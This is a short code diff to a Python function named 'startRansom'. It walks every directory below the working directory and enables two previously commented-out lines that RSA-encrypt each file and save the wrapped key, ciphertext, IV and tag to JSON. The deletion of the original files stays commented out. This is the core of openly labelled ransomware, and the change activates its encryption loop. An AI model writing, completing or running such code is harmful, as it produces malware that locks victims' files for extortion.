@@ -168,7 +168,6 @@ def startRansom():
 
 	for dirName, subDirList, fileList in os.walk(os.getcwd()):
 		print('Found directory: %s' % dirName)
-		# os.chdir(dirName)
 		for fileName in fileList:
 			print(fileName)
 			if(fileName == 'encryption.py' 
@@ -181,11 +180,9 @@ def startRansom():
 
 			else:
 				file = os.path.join(dirName, fileName)
-				#(RSACipher, cipherFile, iv, tag, fileExt) = myRSAEncrypt(file, publicKeyPath)
+				(RSACipher, cipherFile, iv, tag, fileExt) = myRSAEncrypt(file, publicKeyPath)
 				#os.remove(file)
-				#createJSON(file, RSACipher, cipherFile, iv, tag, fileExt)
-				print('%s' % file)
-
+				createJSON(file, RSACipher, cipherFile, iv, tag, fileExt)
 
 # Create a JSON file
 def createJSON(fileName, RSACipher, cipherFile, iv, tag, fileExt):
